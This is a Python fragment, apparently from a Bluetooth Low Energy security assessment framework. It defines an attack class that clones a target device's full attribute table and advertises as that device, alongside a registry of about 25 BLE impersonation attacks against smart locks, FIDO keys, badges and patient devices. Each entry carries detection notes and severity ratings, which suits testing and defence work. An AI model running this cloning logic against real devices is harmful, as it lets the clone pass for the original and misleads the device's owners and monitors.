class BlePeripheralShadowAttack(_Mimic):
    """Stand a shadow copy of a device's attribute table next to it."""

    name = "ble_peripheral_shadow"
    role = "gatt"
    label = "BLE peripheral shadow (clone a device's whole attribute table)"
    category = "rogue"
    noise = "moderate"
    impact = "info"
    finding_severity = "high"
    tool = "wifipilot bt.py (Read By Group Type + ATT reads)"

    description = (
        "Enumerate a device's primary services and read every characteristic value, then "
        "advertise as that device with the same service list: the clone answers a scanner "
        "with the same table, which is what lets it be swapped for the original without "
        "anybody noticing — an inventory that trusts the air is an inventory that can be "
        "written by whoever is closest.")
    detection = (
        "A second device serving one attribute table: the device's own service log sees a "
        "peer it did not provision, and the fixed scanners see a duplicate.")
    devices = ("ble_sensor", "smart_bulb", "ble_beacon")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        target = self.floor().pick("gatt")
        rows: List[Dict[str, Any]] = []
        if target is not None:
            for row in target.gatt_rows():
                if row.get("kind") != "characteristic" or row.get("value") is None:
                    continue
                read = self.read_characteristic(ctx, target.address, int(row["uuid"]))
                rows.append({"uuid": f"0x{int(row['uuid']):04x}", "name": row.get("name", ""),
                             "handle": row.get("handle"), "bytes": read.get("bytes", 0),
                             "value": read.get("value", "")})
        services: List[int] = [entry[2] for entry in target.att_services()] \
            if target is not None else []
        result = self.impersonate(ctx, target.name if target else "WF-SHADOW",
                                  services=services or (0x1800,))
        copied = [row for row in rows if row["bytes"]]
        extra = {"target": target.to_dict() if target is not None else {},
                 "characteristics": rows, "copied": len(copied),
                 "services": [f"0x{uuid:04x}" for uuid in services],
                 "advertised": result.get("advertised", {}),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE peripheral shadow: {len(copied)} characteristic(s) of "
                 f"{target.name if target else 'the device'} copied")
        detail = (f"the clone advertises the same {len(services)} service(s) and holds "
                  f"{len(copied)} of {len(rows)} characteristic value(s): a device that "
                  f"answers the air with its attribute table can be replaced on the air")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="high")


# --------------------------------------------------------------------------- #
# registry
# --------------------------------------------------------------------------- #

ATTACKS: List[type] = [
    BleHidMimicAttack, BleSpeakerMimicAttack, BlePairingMimicAttack, BleBondHijackAttack,
    BleAdvIdentityCloneAttack, BleNameCollisionAttack, BleDeviceMimicAttack,
    BleTrackerMimicAttack, BleBeaconMimicAttack, BleEddystoneMimicAttack,
    BleSmartlockMimicAttack, BleBadgeMimicAttack, BleEvChargerMimicAttack,
    BleMeshMimicAttack, BleAnchorMimicAttack, BlePrinterMimicAttack, BleIrMimicAttack,
    BleFastPairMimicAttack, BleFidoMimicAttack, BleTelemetryMimicAttack,
    BlePatientMimicAttack, BleHidMultiHostAttack, BleConsumerMimicAttack,
    BleAudioLeMimicAttack, BlePeripheralShadowAttack,
]

NAMES: List[str] = [cls.name for cls in ATTACKS]

#: metadata for the registry: what the catalogue, the planner and the docs read
META: Dict[str, Dict[str, Any]] = {}
for _cls in ATTACKS:
    META[_cls.name] = {
        "category": getattr(_cls, "category", "rogue"),
        "noise": getattr(_cls, "noise", "moderate"),
        "impact": getattr(_cls, "impact", "info"),
        "detection": getattr(_cls, "detection", "") or "the peer's own controller log",
        "domain": "bluetooth",
        "devices": list(getattr(_cls, "devices", ())),
        "port": 0, "protocol": "ble",
        "technique": "imitation",
        "severity": getattr(_cls, "finding_severity", "medium"),
    }

REGISTRY = [(cls.name, META[cls.name], cls) for cls in ATTACKS]
